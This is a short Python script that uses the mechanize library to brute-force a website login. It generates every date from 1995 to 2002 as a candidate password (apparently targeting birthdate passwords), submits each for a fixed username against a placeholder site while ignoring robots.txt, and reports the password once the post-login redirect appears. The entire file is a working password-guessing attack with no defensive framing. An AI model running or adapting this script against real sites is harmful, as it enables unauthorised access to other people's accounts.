#!/usr/bin/python
import mechanize

username = "asd" #insert the username

br = mechanize.Browser()

br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

from datetime import timedelta, date

combos = []
def daterange(start_date, end_date):
    for n in range(int((end_date - start_date).days)):
        yield start_date + timedelta(n)

start_date = date(1995, 1, 1)
end_date = date(2002, 12, 31)

for single_date in daterange(start_date, end_date):
     combos.append(single_date.strftime("%d%m%Y"))

r = br.open("http://site.com")
for i in combos:
	new_form = '''
	<form method="post" action="post.haha">
    <b>Enter the username :</b><input type="text" name="user" size="16" maxlength="8">
    <b>Enter the password:</b><input type="password" name="pass" size="16">
    <input type="submit" name="submit" value="Submit">
    </form>
	'''

	r.set_data(new_form)
	br.set_response(r)
	br.select_form(nr = 0)
	br.form['user'] = username
	br.form['pass'] = i
	print("Checking ", br.form['pass'])
	response = br.submit()
	if response.geturl() == "http://newredirectedsiteafterlogin.com":
		print("Correct password is ", i)
		break
